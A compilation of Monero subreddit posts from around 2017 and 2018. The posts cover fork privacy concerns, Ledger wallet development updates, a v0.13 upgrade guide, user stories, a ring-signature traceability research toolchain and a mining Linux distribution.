With this in mind, I am gravely concerned about the discussion of the MoneroV fork. Simply put, users claiming both Monero and MoneroV coins after the fork reveal the true transaction key out of the decoys in the Ring signature. The general response to this issue has been to suggest that not all users will claim coins on both sides, the ring size will be diminished slightly, and that plausible anonymity will be preserved. I propose that we must not view this threat as a group of individuals claiming pump-n-dump coins to make a quick buck, but rather as an organization who wishes to deter future users of Monero by publicly breaking its privacy and therefore its value.

Here are my questions: if an organization creates a sufficient number of wallets with a sufficient number of coins before the fork, what stops them from conducting large amounts of transactions to uncover a large enough number of public keys to compromise the ring? Given that the transaction itself is more important than the amount, could this scale of analysis be done by LE? If parts of my understanding of this process are flawed, would a partially compromised ring (say to a size of 2 or 3) be enough to break anonymity given other solved outputs (potentially from compromised exchanges)? Perhaps this can already be done without the need for a fork, or the compromising of ring is not enough to fully compromise Monero. I would appreciate the input of others more knowledgeable in this realm. I wish for Monero and its mild-mannered users to prosper but the details of this fork worry me."

"So Monero integration is already one of their most requested features to date. Last time they commented on it they stated:

> We would still love to add monero support. Unfortunately, we have not found any easy way to do this. Paybee is still in private beta.

This was in February. Things have changed, we now have [GloBee](https://globee.com).

I think we should let them know that it's time to finally integrate Monero, no more excuses.

"My initial reaction, despite losing some money, was that it was pretty funny. But in thinking about it more, it is completely unacceptable for the developer of a currency, *especially* a privacy focused currency to behave in this way. The market reacted directly in predictable ways to what he did, and that means that he could have personally profited from it. He may or may not have done so, but that is beside the point. Now we can never actually know whether he did this to troll, or to profit.

What he did today makes me fundamentally question his motivations, seriousness about the project, and judgment. In any open source project, that is unacceptable. In a privacy focused, decentralized crypto-currency? That is completely unconscionable. We have to have faith that at the very least, the primary developer of this project is not acting directly in bad faith. And IMO, we can no longer be certain of that.

I would like to think that his motivations were simply to fuck with traders. And if they truly were, that's fine by me (even though I lost money because of it). But the fundamental problem is now we can never know, and he should have been responsible enough to realize that.

If you don't want people speculating on your coin, fine. Don't engage with the speculators. Don't make announcements. Be heads down on development. I'm all for that. But do not deceive people in a way purpose-built to manipulate markets.

It is unfortunately now clear to me that fluffypony simply does not have the maturity and judgment to lead a project of this significance."

"Hello, all. Sarang here with my January monthly research report. As always, comments welcome.

You can [read it here](https://forum.getmonero.org/9/work-in-progress/89005/funding-for-sarang-at-mrl-for-q1-2018?page=&noscroll=1#post-94178) or see the text in the comments below."
"In the privacy community, by which I mean those who advocate in favor of privacy and against the general apathy that people have about their private lives being public, there is a distinct tendency to often phrase things using the word ""privacy"" while in reality meaning something more akin to ""security."" At least, this is my personal interpretation.

The reason for this is simple, privacy is simply one aspect of a person's security. This leads people to beat around the bush when discussing the issues with lacking privacy, but in reality when you lack privacy what you really truly lack is security. You lack control that you otherwise would have, and you needlessly (and perhaps unwittingly) expose yourself to a variety of threats.

When it comes to matters of finance, privacy is absolutely essential to a person's security. It is the main defense people have, since it prevents them being targeted at all. Considering the average person's capacity to secure their devices against capable attackers, this is often their only true defense.

For this reason, I believe it is fair to say that Monero is not a ""privacy coin"" but in reality, a ""security coin"", if you will.

When you give the example of a person's salary being revealed, their net worth being revealed, or any of many other wonderful examples of the consequences of a person lacking privacy, what you are really revealing is a vulnerability that takes a hammer to their personal security (perhaps literally).

I believe it is important to focus on this idea of security, at least some more than it is currently. Particularly, it is useful when discussing *insecure* ""privacy"" coins such as Dash, and especially Verge. We do not need to say that they lack privacy, because people don't immediately understand this implication, what we should say is that these coins are unsafe.

Plain and simple, Monero is safe. Monero is secure."

"Hi all

Just performed a new push, here are the news:

**Status**

Except 2 point, the signature is correctly handled by the device and successfully pushed on tetsnet. That wast the (almost) alpha initial  goals

*point 1*

I still have a problem when generating the key image, but it is seems to be related to underlying mathematical problem on a specific point in math ed25519 stack .

*point 2*
As said in the short commit log, I need to found the last secret generated by client during mlsag. The code could work without fixing that, but  with some hacks it will lead into a severe secret leak information

Any comment on code is welcome and will be appreciate :)

**Next**

* Fixed the two previous point in the next (2 or 3 ?) coming days.
* Then start the UI on NanoS for address and amount validation
* Finally, finalize the integration on NanoS at Wallet level to remove the master secret key from it.

**Beer&Pizza**

I converted 6xmr to € for personal B&P and for my next week trip to Paris in order to share this ongoing success with some other ledger team members.
you're welcome to refuel  ;)

"I live in North America, but my home country is vertically on the other side of the world, in South America. I've been using Monero to send money to my family for a while now, which by itself represents a very important use case. **This is already happening.** This is not vaporware with a cute road map that will change the world. **This is already happening.**

I'm visiting my family here and instead of using an international credit card, I decided to 'sell' moneroj for my friend's fiat: fancy restaurant? Someone pay with a debit card and I send the equivalent in moneroj instantly. This has been working pretty well with a few friends that are tech-savvy and understand the basic concepts of cryptocurrencies.

But today I tested something new. I went on a road trip with my mother where she paid for many things. At the end, I told her to download the Cake Wallet on her iPhone and read the instructions by herself (she knows basic English). Once she was ready, I transferred some moneroj from my Monerujo and it appeared instantly on her phone. Easy like that. Someone who has absolutely no knowledge about cryptocurrencies and how the technology works just created a wallet and received moneroj.

That was the easiest transfer of value that I've ever done. No permission was asked. No third-parties were involved. It was me, my mother and the Monero network.

Monero is getting easier to use by each day, and this is a liberating experience. The magic happens not when everyone in the world understands how a technology works. **The magic happens when everyone is using a technology without even understanding what is happening** in the background -- or you're going to tell me what's going on in the back-end when you swipe your screen to send an email? Well, maybe in this sub a lot of people will know, but the rest of the world using email doesn't.

Thanks for the guys working on Cake wallet. It was a very easy experience.

Thanks for the guys working on Monerujo. It's my main wallet by now.

Thanks for everyone working on the Monero project.

PS: for the mobile wallets, please consider adding localisation support ASAP. the community (myself included) will translate your apps and more people will be able to have these liberating experiences."
"Hi All

Yes last news is from 5 weeks ago, so omg what happened ???

**Status**

I had to work on next ledger device firmware during 3 weeks so my Monero
bandwidth was drastically reduced during this period. But 
hereafter are the news you are waiting for!

Initially I planned to polish the current work for making a push 
request on the v0.11 branch and hope some review, then merge all of 
my mod on master.

For some reasons I started looking at what will happened with the merge.
That was a just O.M.G. During the last three month there was lot
of commits with serious code modification and features added to the 
master branch, but the big OMG is that lot of my mod were in conflict with 
those modifications! 

So I decided two things. The first is to not continue the 0.11 code and 
focus my time on master. The second is to change part of my device integration 
approach.
Indeed, the code mod on master make part my initial approach obsolete. In 
other words, continuing with this initial approach would lead into
a very difficult code to maintain and upgrade in the future.
(I m available to give technical details)

What is the new status? The new approach concerns around 50% of the previously 
made modifications. This ""50%"""" is already rewrite on the client side and almost
rewrite on the device side (hope to finish that tommorrow). The dev doc is obsolete
except for the MLSAG and blind/unblind.


**Next**

Reference doc has still to be updated!!!

On device side, finish to implement new needed commands (done tomorrow?)

On client side a new debug session, the more time consuming task. The goals
is to retrieve the integration level of 0.11 before mid of January.

Among the new feature of Monero client, goals are:

- bulletproof: not supported
- multisig : not supported
- light wallet: maybe supported
- subaddress : would be supported


Btchip announces a Monero client in Q1 2018. It would be OK, but no promise  ;)

"> *Since ever Monero have changed my life to better in every aspect.*


I live in a country called *Venezuela*, and things are pretty screw up, we're living in a **Communist/Socialist** thing with a dictatorial regime for almost 20 years, ever since i was a kid getting basic stuff were pretty hard for us, i had no cellphone or laptop for long time, i had to go to cybercafes to read things and learn stuff for free in this beautiful thing called Internet, as i couldn't pay 30/60/100$ for a full course i had to learn by myself, mostly by the hard way, doing mistakes and rebuilding things, learned basic programming skills, English, and I'm learning Japanese right now.


Fast forwarding where i meet **Monero**, I'm active in the *Mozilla foundation*, because i love privacy, and their work, free for everyone. And i was looking a privacy focused project to contribute i meet other coins, but ***Monero* was the only one that filled what i was looking for**, the price was still 12$, and the community relative small compared to where is now. At first i looked into the code and i thought it was still too much for me as it was too complex, (*it's still too complex for me*)  So i was *lurking* and answering some questions with an very old account that i have deleted, then **i just decide to mine it**, with spare pieces of computers i recycle and built a CPU mini farm, with the XMR *i bought a Laptop*, and *two smartphone* (the first one was stolen, pretty common here), i tried to hodl, but the hardship made me sell it to buy food and other stuff.


The economics here are that off that the minimum wage as right now is almost 15$ per month or less as the black market changes very fast. Maybe it seems like i was using it to profit and yeah i was, but because i had to, I managed to get things i would never would be able to get with a common job, **(1$ = 16.500VEF minimum wage = 250kVEF, a decent laptop is 400$ ~= 6.600.000VEF ~ 26.4 month without spending in anything)** the price of Monero was still 20$~ when it happened, as i was focusing on having a better hashrate XMR-Stak-CPU came, and it was the best for me, i made a tutorial for building it on CentOS 6+.


As i thought i was getting things for free, i need to giveback, i did the Kovri site translation to Spanish, and will be helping more to giveback to the community all this that Monero gave me, as i owe a lot to this great community.


I want to thank you all the people, the olds and the newcommers, we are getting this amazing coin to where it belongs. From the roots, to the tallest leaf, **Monero is the best thing ever**. A lot of people have donated me small quantities of Monero and it helped a lot even when they said it was nothing to a guy that makes 15$ per month, 10$ was too much, and I'm grateful that we have this amazing community that gives money to the Forum founding system within days, even hours to reach a goal, for something that would benefit every single one of us, to the ones putting their money into this tech, and the other that holds and profit, and the ones that survives with the little they profit with this.

I decided to move to Chile in the following months, maybe in December, having almost 800$ selling my latest XMR, (notSoFunFact: i changed 11XMR to BTC when BTC went up, and i made 800$, but then Monero went up from 40$ to 140$ missing the train i have been waiting since January) it will be hard to start over in a new country but i have faith i will continue to help this project as much as i can.

**Again, thank you so much everyone for being awesome and keep up with this project, there's so much left to do, I'll do my part.**

Why monero is the very finest coin.

* **Great community**  
As one who has worked with some other communities as Apache, Mozilla, i can say that Monero has one of the best communities i ever saw, people can donate so much money within hours to fund something. Or just complete a task very fast, help newbies and answer complex questions with ease.
* **Great developers**  
Monero have amazing developers, people with so much knowledge working on this project pump every bit of this machinery. They also welcome new developers and help people getting started.
* **Strong roots**  
Monero have strong fundamental roots that help us continue working on this following a common path. (see right sidebar), besides we as the community that enjoy working on this privacy focused project, help growing awareness about privacy in the whole world and that's what i wanted at the first place, having privacy as a easy to understand concept and why it matter is a gigantic work, and we're doing our part.

It can't be the number of subscribers because Litecoin only has about 70,000 more or so. Maybe market cap? Or Monero attracts tech-curious? Whatever it is, Monero absolutely has it. There are other subreddits too besides LTC that seem to have the same wild bunch of speculator kid bros. So I enjoy browsing around here most."
"Note that this is a preliminary thread to inform community members about the upcoming scheduled protocol upgrade. This thread will be replaced once the binaries are released. 

**First and foremost, you should upgrade to v0.13 once the binaries are released or the tag has been created**  

The binaries, once they are released, can be found here:

https://getmonero.org/downloads/  // CLI released (ARMv8 forthcoming), GUI released 

Alternatively, you can use the Github link:  

**CLI:** https://github.com/monero-project/monero/releases/tag/v0.13.0.4 // Released 

**GUI:** https://github.com/monero-project/monero-gui/releases/tag/v0.13.0.4 // Released 

Note that the release threads can be found here:

- [CLI v0.13.0.4](https://www.reddit.com/r/Monero/comments/9r7inb/cli_v01304_beryllium_bullet_released/)

- [GUI v0.13.0.4](https://www.reddit.com/r/Monero/comments/9ti2on/gui_v01304_beryllium_bullet_released/)

In case you're using the GUI, please take notice of the following:

>**This version, *if using your own (local) node*, requires a database conversion, which may take a few hours and the GUI may show that it's `Disconnected` (or unable to connect) from the daemon (monerod). I'd advise to simply let it run and after the database conversion has completed the GUI will connect back to the daemon (monerod).**

--------------  

**Note that this is a scheduled and consensual network upgrade. Thus, unlike the BCH / BTC split, a new coin *won't* be created.**  

-------------  

# General information about the scheduled network upgrade  

Approximately the 18th of October there will be a scheduled network upgrade on the Monero network. To be sufficiently prepared, a user, service, merchant, pool operator, or exchange should run CLI v0.13.0.4 or GUI v0.13.0.4. The scheduled network upgrade introduces four major changes. First and foremost, a new form of range proofs called Bulletproofs, which will replace the old Borromean range proofs and thereby significantly (i.e. by approximately 80%) reduce the transaction size (and thus fees). Second, a PoW tweak to curb any potential threat of ASICs and further preserve ASIC resistance. As a result, miners will have to update their miners (i.e. mining software) as well. Third, the minimum ring size is bumped to 11 (mixin 10) *and* will be static / fixed. Therefore, pool operators need to ensure that payouts use a ring size of 11 (mixin 10), otherwise they will get rejected by the network.  

A blog about Monero compatible Bulletproofs can be found here:

https://getmonero.org/2017/12/07/Monero-Compatible-Bulletproofs.html

More information about the second PoW tweak can be found here:  

https://github.com/monero-project/monero/pull/4218

The blog that set out a formal stance on ASIC resistance and the intention to maintain ASIC resistance can be found here:

https://getmonero.org/2018/02/11/PoW-change-and-key-reuse.html

In addition, more information about the ring size bump and the decision to make it a static parameter can be found [here](https://github.com/monero-project/monero/issues/4229). Lastly, all changes have been discussed extensively in the last few dev meetings, which can be read here:  

https://monerobase.com/wiki/Category:DevMeeting  

Due to variance the scheduled network upgrade will take place on or around the 18th of October. There is, however, no specific date as the hard fork will be triggered by a specific blockheight. The specific blockheight for the hard fork can be found [here](https://github.com/monero-project/monero/blob/master/src/cryptonote_core/blockchain.cpp#L113-L114). That is:  

> // version 8 starts from block 1685555, which is on or around the 18th of October, 2018. Fork time finalised on 2018-09-02. 

Note that there technically will be two hard forks (i.e. one on approximately the 18th of October and one on the approximately the 19th of October). This provides a grace period on the network where transactions in the transaction pool that still use the old Borromean range proof are allowed to be included in a block by miners. Fortunately, running v0.13.0.0 ensures that one is sufficiently prepared for both hard forks. 

# How do I upgrade?  

First and foremost, we encourage users to check the integrity of the binaries and verify that they were signed by Fluffypony's GPG key. A guide that walks you through this process can be found [here](https://src.getmonero.org/resources/user-guides/verification-windows-beginner.html) for Windows and [here](https://src.getmonero.org/resources/user-guides/verification-allos-advanced.html) for Linux and Mac OS X. 

**CLI:**    

If you are using the CLI you ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero/releases/tag/v0.13.0.4).

2. Extract the new binaries to a new directory of your liking.  

3. Copy over the wallet files from the old directory (the one that contains the v0.12.0.0, v0.12.1.0, v0.12.2.0, or v0.12.3.0 binaries).  

4. Start `monerod` and `monero-wallet-cli` (in case you have to use your wallet).

Note that a blockchain resync is **not** needed. Thus, if you open `monerod-v.0.13.0.4`, it will simply pick up where it left off. Note, however, that the daemon (monerod) will have to upgrade the database version to accommodate the changes required for the initial pruning implementation. 

**GUI:**  

If you are using the GUI you ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero-gui/releases/tag/v0.13.0.4).

2. Extract the new binaries to a new directory of your liking. This is the easiest and recommended way. Alternatively, however, you can overwrite the old binaries.

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet and you should be set for the upcoming scheduled network upgrade.  

4. If you're running a local node, the integrated daemon (monerod) will first have to convert your database to a new version. This may take a few hours and the GUI may show that it's `Disconnected`. I'd advise to simply let it run and after the database conversion has completed the GUI will connect back to the daemon (monerod). 

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`

(2) If, for some reason, the GUI doesn't automatically load your old wallet, you can open it as follows:

**[1]** On the second page of the wizard (first page is language selection) choose `Open a wallet from file`

**[2]** Now select your initial / original wallet. Note that, by default, the wallet files are located in `Documents\Monero\<wallet-name>` (Windows), `Users/<username>/Monero/<wallet-name>` (Mac OS X), or `home/<username>/Monero/<wallet-name>` (Linux).

Lastly, note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off. To reiterate, however, a database conversion is required, which may take a few hours and the GUI may show that it's `Disconnected` from the daemon (monerod).

**Paper wallet:**  

You don't have to do anything. However, if you want to restore a wallet after the scheduled network upgrade, you need to use the new binaries.  

**MyMonero (web):**  

You don't have to do anything, as MyMonero will be properly upgraded in advance of the scheduled network upgrade. 

**MyMonero (desktop):**

Its presumed that MyMonero will release a new version of the desktop wallet in advance of the scheduled network upgrade such that the user is sufficiently prepared. Basically, their new version has to use ring size 11 as minimum default, otherwise users will get their transactions rejected.   

**Mobile wallets:**  

Its presumed that the third-party mobile wallets (Monerujo, Cake, Xwallet, MyMonero, and Edge wallet) will release a new version in advance of the scheduled network upgrade such that the user is sufficiently prepared. Basically, their new version has to use ring size 11 as minimum default, otherwise users will get their transactions rejected.  

**Solo mining:**  

This process is similar to the CLI upgrade process. Thus, see aforementioned CLI steps.  

**Pool mining:**  

Your pool operator should upgrade to the new version. In addition, you should update your mining software to the latest version (the one that includes code to accommodate the second PoW tweak).  

# A call for community action  

It's in our best interest that the upcoming scheduled network upgrade transits as smoothly as possible. Therefore, it is imperative that we, as community, contact economically sensitive nodes (exchanges and services) and inform them about the new version, the upcoming scheduled network upgrade, and that they should run v0.13.0.0 to be sufficiently prepared. A list of exchanges that have integrated Monero can be found here:  

https://coinmarketcap.com/currencies/monero/#markets  

In addition, services that have integrated Monero are, for example, XMR.to, Bisq, LocalMonero, and Morphtoken.  

Lastly, if you have any questions or need any assistance with upgrading, please leave a comment in this thread and the community and I will help you out.

"Up until now, Bitcoin has weathered the sea of trouble that comes with being the most prominent hope for censorship resistant sound money. Bitcoin acceptance by the mainstream financial system isn’t because it won the fight - it’s because it lost. The NSA has been unravelling the bitcoin blockchain since 2013. Undoubtedly, their job is complete, and they have passed their report on to the relevant parties: the bitcoin threat is neutralised. You don’t own bitcoin - you own UTXOs, every last one of which the NSA can account for. Go ahead and green light wall street, futures, and the ETFs - the powers that be are in full control. 


It’s a non-stop FUD campaign against monero from the Bitcoin maximalists on twitter. Like a religious person who fears death because deep down they doubt their beliefs, bitcoiners fear monero because they doubt their coin will ever be fungible. It’s abundantly clear who they are most threatened by.


Monero is undoubtedly the top priority of the NSA and every three letter agency. There has been excessive FUD from the mainstream crypto media casting aspersions on monero’s privacy claims.


Recently, we made enemies of a powerful company with annual revenue greater than the market cap of our coin. A company who is a demonstrated bad actor, and willing to use psyops to divide the community to further their own agenda. As I’m sure many have noticed, mention the wrong thing on this sub, and you’ll be insta downvoted to oblivion. Recently, there have been a suspicious number of low quality posts to this subreddit from users with no history slandering our community and it’s prominent members.


The universe doesn’t owe us financial sovereignty. There is no guarantee the dream of the cypherpunks doesn’t end as a nightmare. We have powerful enemies are on all sides. Bitcoin is subjugated. Monero will be at the forefront of this struggle. 


Circle the wagons."
"We all know how corrupt Bitmain is and how shady their practices are, this is just another thing in line.

First, they limited the order at one Z9 machine per buyer, but as of yesterday:

>To ensure that more individual buyers can purchase miners in this batch, we have set a limit of 50 miner per user.  

But yeah, I don't see how this could cause centralization, lol /s

This is the response of the ZCash foundation if you're interested:
https://z.cash.foundation/blog/statement-on-asics/

Basically, they will waste as much time as possible doing *research*, this is my favorite quote:

>Sometimes miner manufacturer claims are hot air. What if the efficiency gains are minimal compared to new GPUs? Would it be worth engaging in a potentially contentious fork, or splitting the community, if GPUs were still competitive?

Are you kidding, lol? Bitmain has never underperformed, usually the miner hashes even like 5% more than they claim. Anyway, it's obvious that by *late 2018* ASICs will dominate the network and this debate of theirs will pretty much be forgotten, as GPU miners will move to other coins and not touch ZEC any more. 

And this is why I love XMR, the coin has a promise of ASIC resistance and as soon as the threat was real, action was taken to honor that promise with the support from the community. A coin needs a serious and proactive team which is ready to tackle difficulties and challenges as it progresses and remain determinant in the values that the coin promises."

How should people that buy XMR have fun with it and for example use a mobile wallet when the withdrawal fee makes 30% of the amount they want to send? That’s terrible.

"Hey guys,

Monero is the only crypto that I find interesting besides BTC and while 2017 has been the year of Bitcoin, I believe 2018 will be the year of Monero.

Why? Because while Bitcoin users are gonna be more and more regulated and watched over. Exemple: http://www.businessinsider.com/anti-money-laundering-cryptocurrencies-regulation-eu-uk-identity-2017-12

Basically, while I still think Bitcoin will be considered a hedge against infinite fiat supply, which is awesome by itself, I believe Monero will become what Bitcoin was intended to be: real cash for the internet.

So, based on /r/LivingOnBitcoin, I have created /r/LivingOnMonero so that we can post businesses that accept Monero.

Thank you for your attention."

"Hi All


Yes, my last post was long time ago....

**Status**

After two Beta based on 0.12.0, I had to adjust some choice. 

The following status applied on the incoming 0.12.1:

Now when you launch the wallet, the device ask you if you want to export the
private view key to the client. This export allow fast scan of the blockchain.
It means that the scan rate is almost the same as normal wallet (without HW).
If you decline, the bockchain scan involves the device for each transaction, and
the rate is around 1 block per second.

Until Beta5, the application was locked on stagenet/testnet. Since beta5 the application is 
unlocked and you can select mainnet. Testnet is still the default.

There was also some troubles to compile the 0.12.0 on windows, and Ledger Wallet was
only available on Mac and Linux. 0.12.1 will also work on Windows

A """"full"""" """"draft"""" user doc has been added to [github](https://github.com/LedgerHQ/blue-app-monero/blob/master/doc/user/bolos-app-monero.pdf).

All My personal Monero are now protected by my Ledger NanoS.
Some other people has reported successful transaction on mainnet.


**Next**

More Monero feature as previously said. Do not ask when.

The important thing now is still to intensively test and debug this step :)

"Hello all you happy people. It's rehrar. I've got something extremely important that needs talking about, and that thing is open source. If you just want to read about the project and not about the lovingly typed reasons for it, scroll down until you see **Project FOSS**, but I encourage you to read what I wrote. :P

We all know Monero is open source. Many of us know that cryptocurrency as a whole is open source, and that it's important for it to be so so as to be trustless, but many of us are missing an even bigger and more amazing picture of what open source is and does in the world around us.

For some, open source was probably one of those things that when you needed a program quickly (and preferably for little to no cost),  you would type in '[proprietary program] free' on Google, happen upon an open source alternative of said program, download and use it (with varying results of success depending on what you were trying to accomplish), the end. 

For many of us, cryptocurrency is our first foray into the real world of open source. I know it was for me (I was one of the people I talked about above). Since I've been a part of this community for a little over a year however, I've learned a couple major things:

1. Free Open Source Software (FOSS) is more important to the world than we can imagine.

2. Monero owes a great debt to open source ideology. The Monero Project is doing amazing things, but it stands on the shoulders of giants to  do them. 

At its heart, open source is quite altruistic. It's (mostly) not about the money. It's about making the world a better place by letting people take back control of their data, and giving them opportunities that they might not have in a proprietary-driven world. It's about changing the narrative of greed in the world around us by giving hard work away for free for anyone and everyone to use. 

**The current state of cryptocurrency, sadly, has strayed very far from this ideology.**

We see this hope of a changed future with the launch of Bitcoin. It wasn't launched to make money. It was launched to change the world, and allow possibilities never before imagined in the world of personal and global finance. It was, primarily, ideologically driven. Somewhere along the line, this ideology began to deteriorate in the space. 

It wasn't completely the fault of greedy people. Cryptocurrency was in a weird rock and hard place to begin with. See, FOSS wasn't about the money, but BTC was all about money, if you catch my meaning. Over time, and with more people getting involved in the space, that very fine line began to blur, and, as often happens to humanity, ideology died to greed shifting us back to the norm of being 'all about the money'. It almost seems inevitable with how fine that line really was from the beginning.

Monero is one of the few projects I've come across that really strives to maintain that initial sense of almost naive FOSS ideology. In fact, when you look at the common clash in Monero of 'investors' vs 'don't buy monero' people, it really boils down to this one issue.

Now, we can get annoyed at people, or we can educate them. **I find that it's really easy to 'get' the vision of Monero once an individual 'gets' the vision of open source.** Hence, the following project proposal.

**Project FOSS**

Alright, let's get right down to it. There are a lot of awesome FOSS projects out there. Many of them relatively unknown, and working tirelessly and thanklessly to try to make the world a better place. As I said before, Monero owes a debt to open source, and this project is a way to try to pay it back.

Put simply, the idea is this:

- Have a ""FOSS project of the week (month?)
- The chosen project will be ""Monero'd"", which means we as a community try to do the following:
  - Raise 10 XMR (amount negotiable) for the chosen project.
  - Help them set up a wallet to receive above donation and put a wallet address on their site for further XMR donations
  - Help with documentation, website work, translations, etc.
  - See if there's anything else we can do to help
  - Ride off into the sunset leaving everyone with kisses and good feels.
- Continually encourage the community to find, submit, and support FOSS projects of all kinds.

But wait? Waste our precious XMR and time for other non-Monero projects? What does Monero have to gain out of this? Several things actually:

- The Monero community builds bridges of relationship with other FOSS projects. Never underestimate what maintaining a good reputation and keeping good contacts can do.

- If we help them accept Monero (for our one time donation, as well as have a wallet address on their site for future donations), XMR becomes the defacto money of open source. The goal is to have a XMR address on every single open source website ever. Anyone comes to a open source site looking for free software? Bam, Monero is there. Marketing, people. In a way that makes a difference.

- Gives the community a chance to pay back the 'giants' that we stand on in a roundabout way. It also helps us further the ultimate goal of helping people take back control of their data and software (key elements in privacy. Monero is but one tool in a much larger tool belt. This even applies for software that is not directly privacy-related).

- Gives many non-coders who constantly ask how they can help Monero a chance to do something that will help Monero in the ways mentioned above. Even if it's just trying out new software, and maybe finding something cool they didn't know existed that they can share with friends.

**Action steps**

I've already been working on moving this project forward. I've been collecting various fun looking projects (have well over thirty, but only scratching the surface) to support. The list will be publicly available of course. I'd like to start by asking people to comment below with some of their favorite FOSS projects (bonus points for projects that are not cryptocurrency related in any way). I'll add them to the list and give more information going forward.

I will comment with a couple more thoughts for you to read if you want, since this post is getting too long already. I will also be doing a livestream to talk about Monero, open source, privacy, and security to anyone who has questions probably on Tuesday around 17 UTC. Will post details of that later.

Thanks everyone. Hope you get as excited about this project (and FOSS) as I am.

On the client side, the code has been merged. It remains some adjustment to do but
it means the code has been review and approved by Monero Team. 
They made a great review, I thank them!!!

On the device side:

It still remains to finish and debug some man-in-the middle counteract.

"First up, the vast majority of the edits are NOT by a competing cryptocurrency enthusiast or group, they are by jytdog. He has a lot of people that dislike him, and I've found blog posts and YouTube videos panning his edits, because people are obviously sensitive to a bunch of content getting removed.

Now I know that jytdog may seem dogmatic in his edits, but if you actually read the Talk page you can see his reasoning. To quote him:

> i don't doubt that in the way you and some others think and read about cryptocurrencies you find these important (although not the Reuters ref which doesn't even mention Monero) but this is not how Wikipedia articles are built.

His primary complaints seem to be centred around the amount of ""original research"" in the previous entry (see: [Wikipedia:OR](https://en.wikipedia.org/wiki/Wikipedia:No_original_research)), and really poor sourcing (see: [Wikipedia:RS](https://en.wikipedia.org/wiki/Wikipedia:Identifying_reliable_sources)).

**Reverting his changes will do more harm than good, and Wikipedia editors will merely back him up and lock the article, preventing us from editing it at all.**

I suggest that ANYONE who wants to contribute to the article read through the comments he made on the Talk page, read through the Wikipedia:OR and Wikipedia:RS articles, and then make careful, prudent edits. The previous entry may have been informative, but it was also filled with grammatical errors etc.

Let's get this right instead of knee-jerk reacting to it and reverting the efforts of someone who is trying to bring the overall quality and standard of the Monero article up to Wikipedia levels."
The decision was taken to remove the wallet provider fee and implement a donation system in the next release. The X Wallet will continue to be free to download from the App Store.

"As I've seen the recently posted [bb-db from Justin Ehrenhofer](https://monero-blackball.github.io/monero-blackball-site/) I thought I would share the results & toolchain from my (almost finished) Master's thesis (the result of which is basically that the hardforks in spring 2018 didn't have a large effect on traceability and the blackball tool could be improved somewhat).

My results are based on older data (only up to June 9th) but the tool should find (a little) more spent outputs, given the same inputs.

The spent pubks can be found here: https://zenodo.org/record/1304033

The (rather slow) toolchain to deduce spent inputs is released on Github, link here: 
https://oerpli.ml/MONitERO/ (sorry for the stupid wordplay)

## Some notes on the tool

* The main difference should be a more general method of this: https://github.com/monero-project/monero/pull/3671
   * I think the blackball tool only finds ""trivial"" intersections (""N identical rings with ringsize N"")
   * It should also find ""N rings with effective (after removing known mixins) ringsize N"" 
   * Furthermore ""N rings which reference exactly N distinct non-mixin outputs""
   * My tool finds the first two, the difference can be seen here: https://imgur.com/Z7mXQgd
* It does not include the ""public pool transactions"". Shouldn't be very hard to add though. 
* It expects a CSV export of the blockchain(s) and then uses pgSQL for all deductions. The README should help with accomplishing this
* I've chosen pgSQL for the following reasons:
   * I like SQL
   * I wanted the tool to work on very old and cheap hardware. This should allow people without access to high end PCs with lots of RAM to run the analysis on their own if they don't trust me.
   * Simple built-in consistency checks
   * Exploring the data/results is very straightforward

## Methods used

* Zero Mixin Removal
   * https://arxiv.org/abs/1704.04299 & https://eprint.iacr.org/2017/338.pdf
   * Iteratively marks outputs as spent if they occur in rings with effective ringsize = 1
* Intersection Removal
   * a generalized version of ZMR, looks for n identical rings of size n. 
   * The Möser et al. paper added (a more general version of) this in Appendix A 
   * Explored somewhat here: https://eprint.iacr.org/2018/348 (though I use a more general version)
* Fork Analysis
   * If multiple rings have same keyimg, real input has to be in intersection of the sets of referenced outputs. Symmetrix diff of sets are mixins. 

[Here's an unfinished draft of the wrap-up poster](https://github.com/oerpli/MONitERO/blob/master/pdfs/MONitERO-poster_draft.pdf) that has a few illustrations that maybe helps with understanding things.

### Further steps:
* I will extend my dataset with transactions from the last two months and look for differences
* If someone is motivated enough to look at the code and finds issues/bugs/whatever, feel free to contact me on twitter (https://twitter.com/oerpli) or open a PR on GitHub.
* The two papers linked above proposed heuristics (guess newest & output merging) to find additional spent outputs, though with the possibility of false positives.
   * I have implemented these heuristics and tried to estimate their accuracy with the ground-truth obtained with the other methods. Results here: https://imgur.com/a/p37j8Sb  
   * It could be worthwile to find some point up to which the results of the heuristics can be trusted enough and should be included in the analysis

"**Monerujo** is a functional Android Monero Wallet.

The new release [*Silver Colobus*](https://github.com/m2049r/xmrwallet/releases/tag/v0.8) is the first step
in redesigning the UI - this release introduces the new sexy logo and slight changes to the UI.

Be cautious when spending real Monero.

Thanks to the /u/rehrar & /u/baltsar777 for designing the logo and for their future design work,
as well as to the great users on Reddit & Github who helped test and continue to give valuable input.

"I've created a Linux distribution that **boots up and immediately starts to mine Monero** using CPU and all available graphics cards. (Mixing AMD & NVIDIA cards is possible.)

&#x200B;

Besides lending a hand to big miners, **I would love to see this tool used by those moneristas who would otherwise not consider mining.**

&#x200B;

For example, after finishing your day's work in the operating system of your choice, just reboot into a flash drive that holds this mining OS. Done: You're further decentralizing and securing Monero.

Maybe you are a gamer with decent hardware, but on an OS that makes compiling a nice miner difficult. Whenever you finish gaming, just fire up the mining distribution and enjoy it's benefits.

&#x200B;

[Pickaxe Mining OS \(via SSH\)](https://i.redd.it/5c3nh1qfrzj11.jpg)

Here's a screenshot to wet your appetite :) My objective is to publish source code and binaries before the October hardfork.

&#x200B;

Meanwhile, feel free to use this thread to discuss and get answers to any questions you may have!

&#x200B;

**UPDATE 2018-10-05  -  Sources of experimental version released!**

Effective immediately, the **Pickaxe Linux** sources are published at [https://gitlab.com/hokkjoy/pickaxelinux](https://gitlab.com/hokkjoy/pickaxelinux).

Apparently, the NVIDIA license allows to redistribute their binary drivers with Linux.

AMD lacks such a clause.

I am investigating the situation. Until it is clear that I may include their drivers, I will not provide an ISO file.

~~In case anybody else is releasing an ISO image based off the provided sources, be sure to verify its SHA256 checksum before using it:~~

